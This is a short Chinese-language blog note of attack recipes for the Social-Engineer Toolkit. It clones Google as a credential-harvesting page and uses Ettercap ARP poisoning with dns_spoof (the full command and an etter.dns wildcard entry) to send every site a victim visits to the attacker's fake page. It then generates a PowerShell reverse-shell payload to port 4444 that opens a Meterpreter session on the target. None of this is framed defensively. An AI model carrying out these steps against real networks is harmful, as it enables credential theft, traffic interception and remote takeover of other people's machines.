---
title: SET常用方法
date: 2024-01-13 20:29:29
tags: SET
mathjax: true
---

# SET常用方法

## Web攻击向量

依次选择选项1、2、3、1，即社会工程学攻击、Web攻击向量、证书获取攻击方式、使用Web模板，并输入目标主机IP地址，随后选择2，即克隆Google站点。

如果用户目录结构依赖/var/www/html目录，则需要复制/var/www/下所有文件到/var/www/html中，回车即可。

如果Apache等占用80端口，会提示关闭，y即可。

接下来需要使用Ettercap的dns_spoof插件实施ARP攻击和DNS欺骗。

修改/etc/ettercap/etter.dns，例如攻击主机IP为192.168.29.139，则添加：

```
*    A    192.168.29.139
```

使用Ettercap发起ARP攻击，启动dns_spoof插件，实施DNS欺骗：

```bash
ettercap -Tq -M arp:remote -P dns_spoof /192.168.29.139// /192.168.29.2//
```

当目标主机访问任何网站时都将欺骗到攻击主机创建的伪页面。

## PowerShell攻击向量

弹shell用。

依次选择选项1、9、1，输入攻击主机IP和反连接端口4444，是否现在开启监听选yes，然后自动跳转到MSF，生成的代码文件在/root/.set/reports/powershell/x86_powershell_injection.txt，可以复制到目标主机的DOS下运行，也可以改名为.bat运行。执行成功后能看到成功打开了一个Meterpreter会话：

```
sessions
sessions -i 1
```

进入Meterpreter。
